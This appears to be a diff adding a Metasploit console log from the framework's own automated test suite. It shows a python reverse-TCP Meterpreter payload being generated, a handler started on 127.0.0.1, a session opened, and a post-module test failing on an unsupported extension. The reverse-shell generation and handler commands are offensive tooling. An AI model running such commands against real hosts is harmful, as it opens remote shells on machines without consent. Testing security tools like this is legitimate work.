@@ -1,0 +1,20 @@
+use python/meterpreter/reverse_tcp
+[*] Killing all sessions...
+[*] 127.0.0.1 - Meterpreter session 13 closed.
+[4mmsf6[0m post([1m[31mtest/cmd_exec[0m) [0m> generate -o /tmp/meterpreter-spec-rb-python-meterpreter-reverse-tcp20220124-3467-1dee4o0.py -f raw MeterpreterTryToFork=false lport=6014 lhost=127.0.0.1
+[4mmsf6[0m payload([1m[31mpython/meterpreter/reverse_tcp[0m) [0m> [*] Writing 493 bytes to /tmp/meterpreter-spec-rb-python-meterpreter-reverse-tcp20220124-3467-1dee4o0.py...
+[4mmsf6[0m payload([1m[31mpython/meterpreter/reverse_tcp[0m) [0m> to_handler
+[*] Payload Handler Started as Job 13
+[4mmsf6[0m payload([1m[31mpython/meterpreter/reverse_tcp[0m) [0m> 
+[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
+[*] Started reverse TCP handler on 127.0.0.1:6014 
+[*] Sending stage (39804 bytes) to 127.0.0.1
+[*] Meterpreter session 14 opened (127.0.0.1:6014 -> 127.0.0.1:57656 ) at 2022-01-24 01:03:37 +0000
+use test/extapi
+[4mmsf6[0m post([1m[31mtest/extapi[0m) [0m> run session=14 addentropy=true verbose=true
+
+[*] Loading extapi extension...
+[-] Post failed: Rex::Post::Meterpreter::ExtensionLoadError The "extapi" extension is not supported by this Meterpreter type (python/linux)
+[-] Call stack:
+[-]   /home/runner/work/metasploit-framework/metasploit-framework/test/modules/post/test/extapi.rb:32:in `setup'
+[*] Post module execution completed
